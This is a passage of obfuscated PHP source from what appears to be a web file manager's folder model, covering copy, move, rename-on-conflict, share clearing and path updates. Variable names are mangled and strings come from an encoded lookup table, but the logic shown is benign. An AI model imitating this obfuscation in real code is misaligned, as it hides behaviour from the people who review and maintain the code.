$_SERVER[¯‘·½]; $š¹ëÓ‰  = $this->sourceInfo($Š”ùëÈ); $šşôœ­ø = $this->sourceInfo($„Ÿò’¿¥); if (!$š¹ëÓ‰  || !$šşôœ­ø || $šşôœ­ø[$ÍÇÃ“…æ[487]] != $ÍÇÃ“…æ[91]) { return !1; } if ($this->isParentOf($Š”ùëÈ, $„Ÿò’¿¥)) { return !1; } $àøµ²• = $ú³¼ïîÉ ? $ú³¼ïîÉ : $š¹ëÓ‰ [$ÍÇÃ“…æ[32]]; $this->lockCopyStart($Š”ùëÈ); $this->lockWriteStart($„Ÿò’¿¥, $àøµ²•); $ÊÁÊ“¶Á = array($ÍÇÃ“…æ[636] => array(), $ÍÇÃ“…æ[637] => array(), $ÍÇÃ“…æ[638] => array()); $this->targetIsDelete = intval($š¹ëÓ‰ [$ÍÇÃ“…æ[507]]); $äÏ×­º· = $this->fileNameExistAuto($„Ÿò’¿¥, $š¹ëÓ‰ ); $†èŸôñ‹ = $this->_copy($Š”ùëÈ, $„Ÿò’¿¥, $ìĞ­¹Ãœ, $ÊÁÊ“¶Á, !0, $ú³¼ïîÉ); $this->_childrenListClear(); $this->lockCopyEnd($Š”ùëÈ); $this->lockWriteEnd($„Ÿò’¿¥, $àøµ²•); if ($š¹ëÓ‰ [$ÍÇÃ“…æ[487]] == $ÍÇÃ“…æ[91] && $äÏ×­º· == $†èŸôñ‹) { $this->folderSizeResetChildren($äÏ×­º·); } Model($ÍÇÃ“…æ[639])->addAll($ÊÁÊ“¶Á[$ÍÇÃ“…æ[637]], array(), !0); if ($äÏ×­º· != $†èŸôñ‹ || $š¹ëÓ‰ [$ÍÇÃ“…æ[487]] == $ÍÇÃ“…æ[91]) { Model($ÍÇÃ“…æ[640])->eventCopy($†èŸôñ‹); } $this->saveAll($ÊÁÊ“¶Á[$ÍÇÃ“…æ[638]]); Model($ÍÇÃ“…æ[233])->linkAdd($ÊÁÊ“¶Á[$ÍÇÃ“…æ[636]]); $this->folderSizeReset($„Ÿò’¿¥); $this->updateModifyTime($„Ÿò’¿¥); return $†èŸôñ‹; } private function _copy($ÏìäÏ“, $ÅŒåı…œ, $‚ñ…ı‡®, &$·‡²óèÛ, $ÃÒÏºÓ™, $Ô³ïàë¾ = '') { $—íŒŞÀÙ =& $_SERVER[¯‘·½]; $é•ïÈ…Õ = $this->sourceInfoCache($ÏìäÏ“); $Ÿ÷Òš¤— = $é•ïÈ…Õ[$—íŒŞÀÙ[487]] == $—íŒŞÀÙ[91]; $š³¸ßºâ = $Ô³ïàë¾ ? $Ô³ïàë¾ : $é•ïÈ…Õ[$—íŒŞÀÙ[32]]; $ÛûÃŠ = $this->fileNameExistAuto($ÅŒåı…œ, $é•ïÈ…Õ); if ($ÃÒÏºÓ™) { $this->_childrenAllMake($ÏìäÏ“); if ($Ÿ÷Òš¤— && $ÛûÃŠ) { $this->_childrenAllMake($ÛûÃŠ); } } if (!$ÛûÃŠ) { return $this->_copyCreate($ÏìäÏ“, $ÅŒåı…œ, $š³¸ßºâ, $·‡²óèÛ); } $ğíßãìó = $ÛûÃŠ; if ($Ÿ÷Òš¤—) { if ($‚ñ…ı‡® == REPEAT_RENAME_FOLDER) { $š³¸ßºâ = $this->fileNameAutoCache($ÅŒåı…œ, $š³¸ßºâ, $‚ñ…ı‡®, $Ÿ÷Òš¤—); $ğíßãìó = $this->_copyCreate($ÏìäÏ“, $ÅŒåı…œ, $š³¸ßºâ, $·‡²óèÛ); } else { $ô•Ø¨Šº = $this->_childrenList($ÏìäÏ“); foreach ($ô•Ø¨Šº as $ÏïèôîÑ) { $this->_copy($ÏïèôîÑ[$—íŒŞÀÙ[194]], $ÛûÃŠ, $‚ñ…ı‡®, $·‡²óèÛ, !1); } } } else { if ($‚ñ…ı‡® == REPEAT_RENAME || $‚ñ…ı‡® == REPEAT_RENAME_FOLDER) { $š³¸ßºâ = $this->fileNameAutoCache($ÅŒåı…œ, $š³¸ßºâ, $‚ñ…ı‡®, $Ÿ÷Òš¤—); $ğíßãìó = $this->_copyCreate($ÏìäÏ“, $ÅŒåı…œ, $š³¸ßºâ, $·‡²óèÛ); } else { if ($‚ñ…ı‡® == REPEAT_REPLACE) { $æ…“İë¸ = $this->sourceInfoCache($ÛûÃŠ); $¯Í²ï = $this->fileHistory($æ…“İë¸, $é•ïÈ…Õ[$—íŒŞÀÙ[545]], $é•ïÈ…Õ[$—íŒŞÀÙ[79]]); if ($¯Í²ï) { $·‡²óèÛ[$—íŒŞÀÙ[636]][] = $é•ïÈ…Õ[$—íŒŞÀÙ[545]]; } } else { if ($‚ñ…ı‡® == REPEAT_SKIP) { } } } Hook::trigger($—íŒŞÀÙ[641], array($—íŒŞÀÙ[642], $é•ïÈ…Õ, 0)); } return $ğíßãìó; } private function _copyCreate($ŠúÃŠÌ, $“Çê÷Ğ, $å¸×Ñ¾, &$õ×“§Èô) { $ØÒŞÁ¢– =& $_SERVER[¯‘·½]; $‰‹ãöÇˆ = $this->sourceInfoCache($ŠúÃŠÌ); $Ü¥ß¿¬ = $this->sourceInfoCache($“Çê÷Ğ); $¤í©ÒÅş = $this->_makeItemData($‰‹ãöÇˆ, $Ü¥ß¿¬, $å¸×Ñ¾); Hook::trigger($ØÒŞÁ¢–[643], $¤í©ÒÅş); Hook::trigger($ØÒŞÁ¢–[644], array($ØÒŞÁ¢–[645], $¤í©ÒÅş, 0)); $÷õ‡¹¿õ = $this->add($¤í©ÒÅş); $§Î¡‹¹© = array($ØÒŞÁ¢–[194] => $÷õ‡¹¿õ, $ØÒŞÁ¢–[32] => $å¸×Ñ¾); $this->_copyApplyMeta($§Î¡‹¹©, $õ×“§Èô); if ($‰‹ãöÇˆ[$ØÒŞÁ¢–[487]] != $ØÒŞÁ¢–[91]) { $õ×“§Èô[$ØÒŞÁ¢–[636]][] = $‰‹ãöÇˆ[$ØÒŞÁ¢–[545]]; return $÷õ‡¹¿õ; } $·ÍŸ…÷Î = array(); $è„é”õ— = array(); $this->_childrenListAll($ŠúÃŠÌ, $·ÍŸ…÷Î); $¡Ô—¤” = count($·ÍŸ…÷Î); if ($¡Ô—¤” == 0) { return $÷õ‡¹¿õ; } $…ü· = $this->sourceInfo($÷õ‡¹¿õ); foreach ($·ÍŸ…÷Î as $ÚÄæáÔš) { $çèºî–“ = $this->_makeItemData($ÚÄæáÔš, $…ü·, $ÚÄæáÔš[$ØÒŞÁ¢–[32]]); $çèºî–“[$ØÒŞÁ¢–[588]] = $ÚÄæáÔš[$ØÒŞÁ¢–[588]]; $è„é”õ—[] = $çèºî–“; } $this->chunkEventSet($ØÒŞÁ¢–[646], array($ØÒŞÁ¢–[647], $¤í©ÒÅş, $¡Ô—¤”)); $this->addAll($è„é”õ—, array(), !1); $†àçÂÕ‹ = $this->where(array($ØÒŞÁ¢–[193] => $÷õ‡¹¿õ))->select(); $‚ó’Âß“ = $this->_childrenMakeRelation($·ÍŸ…÷Î, $†àçÂÕ‹); $‚ó’Âß“[$ŠúÃŠÌ] = $÷õ‡¹¿õ; $—Şê—‡ = array(); $áÇ€«’¤ = array(); foreach ($†àçÂÕ‹ as $ÚÄæáÔš) { $±ô†’ÊÊ = $ÚÄæáÔš[$ØÒŞÁ¢–[194]]; $ŒØÁ å¢ = $this->_childrenMatch($‚ó’Âß“, $ÚÄæáÔš, $…ü·); $—Şê—‡[] = array($ØÒŞÁ¢–[194], $±ô†’ÊÊ, $ØÒŞÁ¢–[193], $ŒØÁ å¢[$ØÒŞÁ¢–[193]]); $áÇ€«’¤[] = array($ØÒŞÁ¢–[194], $±ô†’ÊÊ, $ØÒŞÁ¢–[588], $ŒØÁ å¢[$ØÒŞÁ¢–[588]]); $this->_copyApplyMeta($ÚÄæáÔš, $õ×“§Èô); if ($ÚÄæáÔš[$ØÒŞÁ¢–[487]] != $ØÒŞÁ¢–[91]) { $õ×“§Èô[$ØÒŞÁ¢–[636]][] = $ÚÄæáÔš[$ØÒŞÁ¢–[545]]; } } $this->chunkEventSet($ØÒŞÁ¢–[648], array($ØÒŞÁ¢–[649], $¤í©ÒÅş, $¡Ô—¤”)); $this->saveAll($—Şê—‡); $this->chunkEventSet($ØÒŞÁ¢–[650], array($ØÒŞÁ¢–[651], $¤í©ÒÅş, $¡Ô—¤”)); $this->saveAll($áÇ€«’¤); return $÷õ‡¹¿õ; } private function _childrenMakeRelation($ºÁœ“äÖ, $”çµàŞº) { $ìº›•°› =& $_SERVER[¯‘·½]; $„—Öã‚ô = array(); $ Í¸Ò = array(); foreach ($ºÁœ“äÖ as $¡ş¢åôÎ) { $ËåÕø  = $¡ş¢åôÎ[$ìº›•°›[32]] . $ìº›•°›[8] . $¡ş¢åôÎ[$ìº›•°›[588]]; $„—Öã‚ô[$ËåÕø ] = $¡ş¢åôÎ[$ìº›•°›[194]]; } foreach ($”çµàŞº as $¡ş¢åôÎ) { $ËåÕø  = $¡ş¢åôÎ[$ìº›•°›[32]] . $ìº›•°›[8] . $¡ş¢åôÎ[$ìº›•°›[588]]; $¢ÎÃï¥¼ = $„—Öã‚ô[$ËåÕø ]; $ Í¸Ò[$¢ÎÃï¥¼] = $¡ş¢åôÎ[$ìº›•°›[194]]; } return $ Í¸Ò; } private function _childrenMatch($šÁÖÕ¼, $ƒÂ½Ì³¶, $ï¦Ï¤‡Ô) { $ö½ÈÙ‰© =& $_SERVER[¯‘·½]; $òŠšîíå = $ï¦Ï¤‡Ô[$ö½ÈÙ‰©[588]]; $ˆİšÀÂ× = $this->parentLevelArray($ƒÂ½Ì³¶[$ö½ÈÙ‰©[588]]); foreach ($ˆİšÀÂ× as $¥‰¨ã) { if (isset($šÁÖÕ¼[$¥‰¨ã])) { $òŠšîíå .= $šÁÖÕ¼[$¥‰¨ã] . $ö½ÈÙ‰©[652]; } } $òŠšîíå = rtrim($òŠšîíå, $ö½ÈÙ‰©[50]) . $ö½ÈÙ‰©[50]; $®”—üÒ¹ = $this->parentLevelArray($òŠšîíå); $’°Œ±û° = $®”—üÒ¹[count($®”—üÒ¹) - 1]; return array($ö½ÈÙ‰©[193] => $’°Œ±û°, $ö½ÈÙ‰©[588] => $òŠšîíå); } private function _makeItemData($«ÖØğßæ, $‰®›•¨Ø, $ÈÃ”æš) { $°éöø‘¼ =& $_SERVER[¯‘·½]; $Ì¨Ú„•Ã = array($°éöø‘¼[653] => $«ÖØğßæ[$°éöø‘¼[487]], $°éöø‘¼[496] => $ÈÃ”æš, $°éöø‘¼[654] => $«ÖØğßæ[$°éöø‘¼[488]] ? $«ÖØğßæ[$°éöø‘¼[488]] : $°éöø‘¼[12], $°éöø‘¼[546] => $«ÖØğßæ[$°éöø‘¼[545]] ? $«ÖØğßæ[$°éöø‘¼[545]] : 0, $°éöø‘¼[624] => $«ÖØğßæ[$°éöø‘¼[79]] ? $«ÖØğßæ[$°éöø‘¼[79]] : 0, $°éöø‘¼[655] => intval($‰®›•¨Ø[$°éöø‘¼[191]]), $°éöø‘¼[656] => intval($‰®›•¨Ø[$°éöø‘¼[573]]), $°éöø‘¼[657] => intval(USER_ID), $°éöø‘¼[658] => intval(USER_ID), $°éöø‘¼[479] => intval($‰®›•¨Ø[$°éöø‘¼[194]]), $°éöø‘¼[659] => $‰®›•¨Ø[$°éöø‘¼[588]] . $‰®›•¨Ø[$°éöø‘¼[194]] . $°éöø‘¼[50], $°éöø‘¼[500] => $«ÖØğßæ[$°éöø‘¼[88]] ? $«ÖØğßæ[$°éöø‘¼[88]] : time(), $°éöø‘¼[506] => 0, $°éöø‘¼[660] => $°éöø‘¼[12]); return $Ì¨Ú„•Ã; } private function _copyApplyMeta($ÆÓ¥¥Ò£, &$¿ğïƒ¾) { $¬ñ˜ç½ =& $_SERVER[¯‘·½]; $ù›ÏÆÈ› = $ÆÓ¥¥Ò£[$¬ñ˜ç½[194]]; $«ççûıˆ = $ÆÓ¥¥Ò£[$¬ñ˜ç½[32]]; if (!isset($ÆÓ¥¥Ò£[$¬ñ˜ç½[661]]) || !$ÆÓ¥¥Ò£[$¬ñ˜ç½[661]] || $ÆÓ¥¥Ò£[$¬ñ˜ç½[661]] == $¬ñ˜ç½[231]) { $¿ğïƒ¾[$¬ñ˜ç½[638]][] = array($¬ñ˜ç½[194], $ù›ÏÆÈ›, $¬ñ˜ç½[661], short_id($ù›ÏÆÈ›)); } if (Input::check($«ççûıˆ, $¬ñ˜ç½[662])) { $¿ğïƒ¾[$¬ñ˜ç½[637]][] = array($¬ñ˜ç½[194] => $ù›ÏÆÈ›, $¬ñ˜ç½[97] => $¬ñ˜ç½[540], $¬ñ˜ç½[452] => str_replace($¬ñ˜ç½[53], $¬ñ˜ç½[12], Pinyin::get($«ççûıˆ))); $¿ğïƒ¾[$¬ñ˜ç½[637]][] = array($¬ñ˜ç½[194] => $ù›ÏÆÈ›, $¬ñ˜ç½[97] => $¬ñ˜ç½[539], $¬ñ˜ç½[452] => Pinyin::get($«ççûıˆ, $¬ñ˜ç½[663])); } $¿ğïƒ¾[$¬ñ˜ç½[637]][] = array($¬ñ˜ç½[194] => $ù›ÏÆÈ›, $¬ñ˜ç½[97] => $¬ñ˜ç½[519], $¬ñ˜ç½[452] => KodSort::makeStr($«ççûıˆ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($©Å°½œÇ) { $Ö§Ÿ‹Ë =& $_SERVER[¯‘·½]; $îÄş¾ÀŠ = $this->sourceInfo($©Å°½œÇ); $•èÄ¿„Ç = $Ö§Ÿ‹Ë[664]; $ŒÁƒ´âË = array($Ö§Ÿ‹Ë[588] => array($Ö§Ÿ‹Ë[619], $îÄş¾ÀŠ[$Ö§Ÿ‹Ë[588]] . $©Å°½œÇ . $Ö§Ÿ‹Ë[620]), $Ö§Ÿ‹Ë[507] => $this->targetIsDelete); $ÍùÇ Èõ = $this->field($•èÄ¿„Ç)->where($ŒÁƒ´âË)->select(); if (!$ÍùÇ Èõ) { return; } $ÍùÇ Èõ = array_to_keyvalue($ÍùÇ Èõ, $Ö§Ÿ‹Ë[194]); foreach ($ÍùÇ Èõ as $ƒÌ©¿) { $„†è­È÷ = $ƒÌ©¿[$Ö§Ÿ‹Ë[193]]; $©Å°½œÇ = $ƒÌ©¿[$Ö§Ÿ‹Ë[194]]; if (!isset($this->_childrenListCache[$©Å°½œÇ]) && $ƒÌ©¿[$Ö§Ÿ‹Ë[487]] == $Ö§Ÿ‹Ë[91]) { $this->_childrenListCache[$©Å°½œÇ] = array(); } if (!isset($this->_childrenListCache[$„†è­È÷])) { $this->_childrenListCache[$„†è­È÷] = array(); } $this->_childrenListCache[$„†è­È÷][$©Å°½œÇ] = $ƒÌ©¿; $this->_childrenItemCache[$©Å°½œÇ] = $ƒÌ©¿; } } private function _childrenListAll($ˆµ‰ÌÛƒ, &$Ë“—Äƒ…) { $õÈóï­Ø =& $_SERVER[¯‘·½]; if (!isset($this->_childrenListCache[$ˆµ‰ÌÛƒ])) { return; } $¿¼˜Øî¢ = $this->_childrenListCache[$ˆµ‰ÌÛƒ]; foreach ($¿¼˜Øî¢ as $Şºë«Í« => $Æ²±‘å¬) { $Ë“—Äƒ…[$Şºë«Í«] = $Æ²±‘å¬; if ($Æ²±‘å¬[$õÈóï­Ø[487]] == $õÈóï­Ø[91]) { $this->_childrenListAll($Şºë«Í«, $Ë“—Äƒ…); } } } private function sourceInfoCache($òÇµ†ÛÚ) { if (isset($this->_childrenItemCache[$òÇµ†ÛÚ])) { return $this->_childrenItemCache[$òÇµ†ÛÚ]; } return $this->sourceInfo($òÇµ†ÛÚ); } private function _childrenList($…Óö“©) { if (isset($this->_childrenListCache[$…Óö“©])) { return $this->_childrenListCache[$…Óö“©]; } return $this->_childrenListSelect($…Óö“©); } private function _childrenListSelect($ˆÓ—«Ò’) { $÷¢şªÀ¼ =& $_SERVER[¯‘·½]; $‚Í¿²ÖÁ = array($÷¢şªÀ¼[193] => $ˆÓ—«Ò’, $÷¢şªÀ¼[507] => $this->targetIsDelete); $Äí¡İœ = $this->where($‚Í¿²ÖÁ)->select(); $Äí¡İœ = $Äí¡İœ ? $Äí¡İœ : array(); $ê¬‚… = array_to_keyvalue($Äí¡İœ, $÷¢şªÀ¼[194]); $this->_childrenListCache[$ˆÓ—«Ò’] = $ê¬‚…; foreach ($ê¬‚… as $ˆÓ—«Ò’ => $€Ü†‰Ÿ) { $this->_childrenItemCache[$ˆÓ—«Ò’] = $€Ü†‰Ÿ; } return $ê¬‚…; } private function fileNameExistAuto($ÓşƒˆÃ, $Ÿ¹ôå½…) { $è“Ø­ßŒ =& $_SERVER[¯‘·½]; if ($Ÿ¹ôå½…[$è“Ø­ßŒ[507]] == $è“Ø­ßŒ[91]) { return $this->fileNameExist($ÓşƒˆÃ, $Ÿ¹ôå½…[$è“Ø­ßŒ[32]]); } return $this->fileNameExistCache($ÓşƒˆÃ, $Ÿ¹ôå½…[$è“Ø­ßŒ[32]]); } private function fileNameExistCache($¨²æÕ¹Ñ, $“Â¬„‡) { $Ïš­½ÆÙ =& $_SERVER[¯‘·½]; $“Â¬„‡ = strtolower($“Â¬„‡); $ªÍøú‹å = $this->_childrenList($¨²æÕ¹Ñ); foreach ($ªÍøú‹å as $ĞÔÕğåÁ) { if ($“Â¬„‡ == strtolower($ĞÔÕğåÁ[$Ïš­½ÆÙ[32]])) { return $ĞÔÕğåÁ[$Ïš­½ÆÙ[194]]; } } return !1; } private function fileNameAutoCache($˜ÑèäÁ…, $¢¬»ÅñÍ, $İùò—’€, $–äŸè¯à) { $Û™³óæ =& $_SERVER[¯‘·½]; $–á¤™Íš = $this->_childrenList($˜ÑèäÁ…); $ğÉşğŸ‘ = array_to_keyvalue($–á¤™Íš, $Û™³óæ[12], $Û™³óæ[32]); return $this->fileNameAutoGet($ğÉşğŸ‘, $¢¬»ÅñÍ, $İùò—’€, $–äŸè¯à); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ø°ÚÍà, $æÒŒŠ—ñ, $‹àÒ© = REPEAT_REPLACE, $‡÷ˆ§ñ€ = '') { $›³ãñø² =& $_SERVER[¯‘·½]; $´ª×Ó·Ô = $this->sourceInfo($ø°ÚÍà); $Ü’¶òæƒ = $this->sourceInfo($æÒŒŠ—ñ); if ($´ª×Ó·Ô[$›³ãñø²[193]] == $Ü’¶òæƒ[$›³ãñø²[194]]) { if ($´ª×Ó·Ô[$›³ãñø²[507]] == $›³ãñø²[91]) { Model($›³ãñø²[505])->restore(array($ø°ÚÍà)); } if (!$‡÷ˆ§ñ€ || $‡÷ˆ§ñ€ == $´ª×Ó·Ô[$›³ãñø²[32]]) { return $ø°ÚÍà; } } $É“¬Å¦ = $this->pathInfoMore($ø°ÚÍà); if ($this->isParentOf($ø°ÚÍà, $æÒŒŠ—ñ)) { return !1; } if (!$´ª×Ó·Ô || !$Ü’¶òæƒ || $Ü’¶òæƒ[$›³ãñø²[487]] != $›³ãñø²[91]) { return !1; } Hook::trigger($›³ãñø²[665], $É“¬Å¦); $this->targetIsDelete = intval($´ª×Ó·Ô[$›³ãñø²[507]]); if ($´ª×Ó·Ô[$›³ãñø²[193]] == $æÒŒŠ—ñ && $‡÷ˆ§ñ€ != $´ª×Ó·Ô[$›³ãñø²[32]]) { $çÀ½¦ñ = $this->fileNameExist($æÒŒŠ—ñ, $‡÷ˆ§ñ€); if ($çÀ½¦ñ && $´ª×Ó·Ô[$›³ãñø²[487]] == $›³ãñø²[231]) { $ûêáÅ² = $this->sourceInfo($çÀ½¦ñ); $‹æ Ã÷ = $this->fileHistory($ûêáÅ², $´ª×Ó·Ô[$›³ãñø²[545]], $´ª×Ó·Ô[$›³ãñø²[79]]); if (!$‹æ Ã÷) { Model($›³ãñø²[548])->remove($´ª×Ó·Ô[$›³ãñø²[545]]); } $this->removeNow($ø°ÚÍà, !1); $this->folderSizeReset($æÒŒŠ—ñ); Hook::trigger($›³ãñø²[666], $É“¬Å¦); return $çÀ½¦ñ; } } $ËªÈò÷¾ = $‡÷ˆ§ñ€ ? $‡÷ˆ§ñ€ : $´ª×Ó·Ô[$›³ãñø²[32]]; $this->lockMoveStart($ø°ÚÍà); $this->lockWriteStart($æÒŒŠ—ñ, $ËªÈò÷¾); $™¾ú£ïõ = array($›³ãñø²[636] => array(), $›³ãñø²[667] => !1); $this->clearShare($ø°ÚÍà, $æÒŒŠ—ñ); $öùö£ÓÛ = $this->fileNameExistAuto($æÒŒŠ—ñ, $´ª×Ó·Ô); $ìáşşı = $this->_move($ø°ÚÍà, $æÒŒŠ—ñ, $‹àÒ©, $™¾ú£ïõ, $‡÷ˆ§ñ€); $this->sourceCacheClear(); if ($´ª×Ó·Ô[$›³ãñø²[487]] == $›³ãñø²[91] && $öùö£ÓÛ) { $this->folderSizeResetChildren($ìáşşı); } Model($›³ãñø²[233])->linkAdd($™¾ú£ïõ[$›³ãñø²[636]]); if ($ìáşşı && $öùö£ÓÛ && $™¾ú£ïõ[$›³ãñø²[667]]) { $òÈª½²È = $´ª×Ó·Ô[$›³ãñø²[487]] == $›³ãñø²[91] ? $this->_childrenListSelect($ø°ÚÍà) : !1; $¹Ò¸½±„ = $òÈª½²È && count($òÈª½²È) > 0 ? !0 : !1; $this->removeNow($ø°ÚÍà, $¹Ò¸½±„); } $this->lockMoveEnd($ø°ÚÍà); $this->lockWriteEnd($æÒŒŠ—ñ, $ËªÈò÷¾); $this->folderSizeReset($´ª×Ó·Ô[$›³ãñø²[193]]); $this->folderSizeReset($æÒŒŠ—ñ); $¨ÊØü‚è = array($´ª×Ó·Ô[$›³ãñø²[193]], $æÒŒŠ—ñ); if ($´ª×Ó·Ô[$›³ãñø²[487]] == $›³ãñø²[91]) { $¨ÊØü‚è[] = $ø°ÚÍà; } $this->updateModifyTime($¨ÊØü‚è); Model($›³ãñø²[640])->eventMove($ø°ÚÍà, $´ª×Ó·Ô[$›³ãñø²[193]], $æÒŒŠ—ñ); Hook::trigger($›³ãñø²[666], $É“¬Å¦); return $ìáşşı; } private function _move($“˜öÜ«–, $ŸÎÄÌ›, $¨âÇÎä¡, &$‹ÎÜÚşĞ, $‘¹Â³ = '') { $Õ»Ñèúú =& $_SERVER[¯‘·½]; $¡èŞİûÕ = $this->sourceInfo($“˜öÜ«–); $›Ê–Ä‹Ö = $¡èŞİûÕ[$Õ»Ñèúú[487]] == $Õ»Ñèúú[91]; $à°†³Šê = $‘¹Â³ ? $‘¹Â³ : $¡èŞİûÕ[$Õ»Ñèúú[32]]; $¡¦¾š®¨ = $this->fileNameExistAuto($ŸÎÄÌ›, $¡èŞİûÕ); $this->lockMoveStart($“˜öÜ«–); $this->lockWriteStart($ŸÎÄÌ›, $à°†³Šê); if (!$¡¦¾š®¨) { return $this->_moveForce($“˜öÜ«–, $ŸÎÄÌ›, $à°†³Šê); } $¸£¹ˆ‹ß = $¡¦¾š®¨; $Šò®ã°Õ = !1; if ($›Ê–Ä‹Ö) { if ($¨âÇÎä¡ == REPEAT_RENAME_FOLDER) { $à°†³Šê = $this->fileNameAuto($ŸÎÄÌ›, $à°†³Šê, $¨âÇÎä¡, $›Ê–Ä‹Ö); $¸£¹ˆ‹ß = $this->_moveForce($“˜öÜ«–, $ŸÎÄÌ›, $à°†³Šê); } else { $—ñáªÁ” = $this->_childrenListSelect($“˜öÜ«–); foreach ($—ñáªÁ” as $”Ã¢—¯Ü) { $Íğ“ƒåÅ = REPEAT_REPLACE; $this->_move($”Ã¢—¯Ü[$Õ»Ñèúú[194]], $¡¦¾š®¨, $Íğ“ƒåÅ, $‹ÎÜÚşĞ); } $Šò®ã°Õ = !0; } } else { if ($¨âÇÎä¡ == REPEAT_RENAME || $¨âÇÎä¡ == REPEAT_RENAME_FOLDER) { $à°†³Šê = $this->fileNameAuto($ŸÎÄÌ›, $à°†³Šê, $¨âÇÎä¡, $›Ê–Ä‹Ö); $¸£¹ˆ‹ß = $this->_moveForce($“˜öÜ«–, $ŸÎÄÌ›, $à°†³Šê); } else { $¨ìŠ¬† = $this->sourceInfoCache($¡¦¾š®¨); $Ê”¤É¿¦ = $this->fileHistory($¨ìŠ¬†, $¡èŞİûÕ[$Õ»Ñèúú[545]], $¡èŞİûÕ[$Õ»Ñèúú[79]]); if ($Ê”¤É¿¦) { $‹ÎÜÚşĞ[$Õ»Ñèúú[636]][] = $¡èŞİûÕ[$Õ»Ñèúú[545]]; } $Šò®ã°Õ = !0; } } if ($Šò®ã°Õ) { $‹ÎÜÚşĞ[$Õ»Ñèúú[667]] = !0; } return $¸£¹ˆ‹ß; } private function _moveForce($–ïŞ¬ˆş, $Çı¶Íâ², $ÊÓœ¿åÖ) { $Çñ’‘Œ¨ =& $_SERVER[¯‘·½]; $Ñ£Çõ½Ä = $this->sourceInfo($–ïŞ¬ˆş); $’àŒ×ª¬ = $this->sourceInfo($Çı¶Íâ²); $åï´ ·Ë = $Ñ£Çõ½Ä[$Çñ’‘Œ¨[487]] == $Çñ’‘Œ¨[91]; $¯ÍÂõ¿Ÿ = array($Çñ’‘Œ¨[479] => $’àŒ×ª¬[$Çñ’‘Œ¨[194]], $Çñ’‘Œ¨[659] => $’àŒ×ª¬[$Çñ’‘Œ¨[588]] . $’àŒ×ª¬[$Çñ’‘Œ¨[194]] . $Çñ’‘Œ¨[50], $Çñ’‘Œ¨[655] => $’àŒ×ª¬[$Çñ’‘Œ¨[191]], $Çñ’‘Œ¨[656] => $’àŒ×ª¬[$Çñ’‘Œ¨[573]], $Çñ’‘Œ¨[658] => USER_ID, $Çñ’‘Œ¨[496] => $ÊÓœ¿åÖ); $»İœíüô = $Ñ£Çõ½Ä[$Çñ’‘Œ¨[191]] == SourceModel::TYPE_GROUP && $’àŒ×ª¬[$Çñ’‘Œ¨[191]] == SourceModel::TYPE_GROUP && $Ñ£Çõ½Ä[$Çñ’‘Œ¨[573]] == $’àŒ×ª¬[$Çñ’‘Œ¨[573]]; if (!$»İœíüô && $this->moveClearAuth) { Model($Çñ’‘Œ¨[571])->authClear($–ïŞ¬ˆş); } $ìî£½ = $Ñ£Çõ½Ä[$Çñ’‘Œ¨[507]] == $Çñ’‘Œ¨[91] && $’àŒ×ª¬[$Çñ’‘Œ¨[507]] != $Çñ’‘Œ¨[91]; if ($ìî£½) { $¯ÍÂõ¿Ÿ[$Çñ’‘Œ¨[506]] = 0; } if ($åï´ ·Ë) { $¬³ÓºÅä = array($Çñ’‘Œ¨[659] => array($Çñ’‘Œ¨[619], $Ñ£Çõ½Ä[$Çñ’‘Œ¨[588]] . $Ñ£Çõ½Ä[$Çñ’‘Œ¨[194]] . $Çñ’‘Œ¨[620])); $åûéÍ’ = $Ñ£Çõ½Ä[$Çñ’‘Œ¨[588]] . $Ñ£Çõ½Ä[$Çñ’‘Œ¨[194]] . $Çñ’‘Œ¨[50]; $ß¯ÂÁó« = $’àŒ×ª¬[$Çñ’‘Œ¨[588]] . $’àŒ×ª¬[$Çñ’‘Œ¨[194]] . $Çñ’‘Œ¨[50] . $Ñ£Çõ½Ä[$Çñ’‘Œ¨[194]] . $Çñ’‘Œ¨[50]; $À±à—®¸ = array($Çñ’‘Œ¨[659] => array($Çñ’‘Œ¨[668], "\x72\145\160\154\x61\x63\145\50\160\141\x72\x65\x6e\x74\114\145\166\145\154\54\47{$åûéÍ’}\47\54\x27{$ß¯ÂÁó«}\x27\x29"), $Çñ’‘Œ¨[655] => $’àŒ×ª¬[$Çñ’‘Œ¨[191]], $Çñ’‘Œ¨[656] => $’àŒ×ª¬[$Çñ’‘Œ¨[573]]); if ($ìî£½) { $À±à—®¸[$Çñ’‘Œ¨[506]] = 0; } $this->where($¬³ÓºÅä)->data($À±à—®¸)->save(); } $this->where(array($Çñ’‘Œ¨[493] => $–ïŞ¬ˆş))->data($¯ÍÂõ¿Ÿ)->save(); return $–ïŞ¬ˆş; } private function clearShare($¦ÍƒçÉĞ, $ÊÂöèíé) { $ÕÁ‘²ãù =& $_SERVER[¯‘·½]; $˜ºàÈ¢ = $this->sourceInfo($¦ÍƒçÉĞ); $—ôŒ›Ú = $this->sourceInfo($ÊÂöèíé); if ($˜ºàÈ¢[$ÕÁ‘²ãù[573]] == $—ôŒ›Ú[$ÕÁ‘²ãù[573]] && $˜ºàÈ¢[$ÕÁ‘²ãù[191]] == $ÕÁ‘²ãù[669]) { return; } $ ¸Ä°ƒ = array($ÕÁ‘²ãù[588] => array($ÕÁ‘²ãù[619], $˜ºàÈ¢[$ÕÁ‘²ãù[588]] . $¦ÍƒçÉĞ . $ÕÁ‘²ãù[620])); $Øêß¸ Ğ = $this->field($ÕÁ‘²ãù[493])->where($ ¸Ä°ƒ)->getField($ÕÁ‘²ãù[194], !0); if (!$Øêß¸ Ğ) { return; } $ ¸Ä°ƒ = array($ÕÁ‘²ãù[194] => array($ÕÁ‘²ãù[7], $Øêß¸ Ğ), $ÕÁ‘²ãù[670] => 1); $£œœû¯é = Model($ÕÁ‘²ãù[671])->field($ÕÁ‘²ãù[672])->where($ ¸Ä°ƒ)->select(); if (!$£œœû¯é) { return; } $£œœû¯é = array_to_keyvalue($£œœû¯é, $ÕÁ‘²ãù[12], $ÕÁ‘²ãù[672]); $ ¸Ä°ƒ = array($ÕÁ‘²ãù[672] => array($ÕÁ‘²ãù[7], $£œœû¯é)); Model($ÕÁ‘²ãù[671])->where($ ¸Ä°ƒ)->save(array($ÕÁ‘²ãù[670] => 0)); Model($ÕÁ‘²ãù[673])->where($ ¸Ä°ƒ)->delete(); } public function copyFolderFromIO($ÙÙØ‘«¼, $µ²‚˜ ê, $ÙÇ²ôÔş, $“¤ìÁøò, $òİ••ùË, $Ã­Ï©å¡ = false) { $ûğêËÜì =& $_SERVER[¯‘·½]; 